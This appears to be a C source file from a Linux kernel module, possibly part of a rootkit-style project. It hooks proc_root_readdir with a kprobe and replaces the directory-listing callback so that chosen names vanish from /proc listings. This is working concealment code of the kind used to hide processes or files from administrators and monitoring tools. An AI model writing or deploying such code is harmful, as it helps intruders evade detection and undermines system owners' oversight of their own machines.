// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/version.h>

#include "hk.h"
#include "hk_kprobe.h"
#include "hidedir.h"

#define HD_MAX 16
#define HD_NAME_MAX 256

static char hd_names[HD_MAX][HD_NAME_MAX];
static int hd_count;

static filldir_t hd_old_actor;

static struct hk_kprobe hd_kp;

#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 1, 0)
static int hd_filldir(struct dir_context *ctx, const char *name, int namelen,
		      loff_t offset, u64 ino, unsigned int d_type)
{
	int i;

	for (i = 0; i < hd_count; i++) {
		if (namelen == (int)strlen(hd_names[i]) &&
		    !strncmp(name, hd_names[i], namelen))
			return 0;
	}
	return hd_old_actor(ctx, name, namelen, offset, ino, d_type);
}
#else
static bool hd_filldir(struct dir_context *ctx, const char *name, int namelen,
		       loff_t offset, u64 ino, unsigned int d_type)
{
	int i;

	for (i = 0; i < hd_count; i++) {
		if (namelen == (int)strlen(hd_names[i]) &&
		    !strncmp(name, hd_names[i], namelen))
			return true;
	}
	return hd_old_actor(ctx, name, namelen, offset, ino, d_type);
}
#endif

static int hd_pre(struct kprobe *kp, struct pt_regs *regs)
{
	struct dir_context *ctx = (struct dir_context *)regs->regs[1];

	hd_old_actor = ctx->actor;
	ctx->actor = hd_filldir;
	return 0;
}

int hidedir_init(void)
{
	return 0;
}

void hidedir_exit(void)
{
	hidedir_stop();
}

int hidedir_add(const char *name)
{
	int i;

	if (!name || !*name)
		return -EINVAL;
	if (strlen(name) >= HD_NAME_MAX)
		return -E2BIG;
	for (i = 0; i < hd_count; i++) {
		if (!strcmp(hd_names[i], name))
			return 0;
	}
	if (hd_count >= HD_MAX)
		return -ENOSPC;
	strscpy(hd_names[hd_count], name, HD_NAME_MAX);
	hd_count++;
	return 0;
}

int hidedir_remove(const char *name)
{
	int i;

	for (i = 0; i < hd_count; i++) {
		if (!strcmp(hd_names[i], name)) {
			memmove(hd_names[i], hd_names[i + 1],
				(hd_count - i - 1) * HD_NAME_MAX);
			hd_count--;
			return 0;
		}
	}
	return -ENOENT;
}

void hidedir_clear(void)
{
	hd_count = 0;
}

int hidedir_start(void)
{
	return hk_kprobe_install(&hd_kp, "proc_root_readdir", hd_pre);
}

void hidedir_stop(void)
{
	hk_kprobe_remove(&hd_kp);
}
